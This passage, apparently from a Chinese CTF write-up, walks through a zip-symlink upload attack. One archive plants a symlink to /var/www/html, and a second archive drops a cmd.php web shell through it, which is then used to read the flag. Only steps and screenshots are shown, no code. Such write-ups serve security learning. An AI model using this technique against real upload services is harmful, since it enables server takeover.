![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5b046e2e30e80acd46c5310c927640cbd416402b.webp%23pic_center)

此时上传该test.zip解压出里边的文件也是软连接`/var/www/html`目录下接下来的思路就是想办法构造一个gethsell文件让gethsell文件正好解压在`/var/www/html` 此时就可以getshell。  
构造第二个压缩包，我们先创建一个test目录(因为上一个压缩包里边目录就是test)，在test目录下写一个shell文件，在压缩创建的test目录 此时压缩包目录架构是：`test/cmd.php`。  
当我们上传这个压缩包时会覆盖上一个test目录，但是test目录软链接指向`/var/www/html`解压的时候会把`cmd.php`放在`/var/www/html`，此时我们达到了getsehll的目的。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3cc998e90585f357db7e41c689255c76dabbadc6.webp%23pic_center)

上传第一个压缩包：  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-83ea2df210ed6c12393e596aedf2a01e2eee9a52.webp%23pic_center)

在上传第二个压缩包文件，此时cmd.php已经在`/var/ww/html`目录下访问。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6f658ad2799c47ec06ac017030beda3ec3bdf741.webp%23pic_center)

访问cmd.php执行命令成功读取到flag。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-87e284e7f1b45648b70073b80501bac35a688cb8.watermark%2Ctype_zhjvawrzyw5zzmfsbgjhy2s%2Cshadow_50%2Ctext_q1netiba5rex5l-h5pyn5y2d6yem55uu5a6j5ywo5a6e6aqm5a6k%2Csize_17%2Ccolor_ffffff%2Ct_70%2Cg_se%2Cx_16%23pic_center)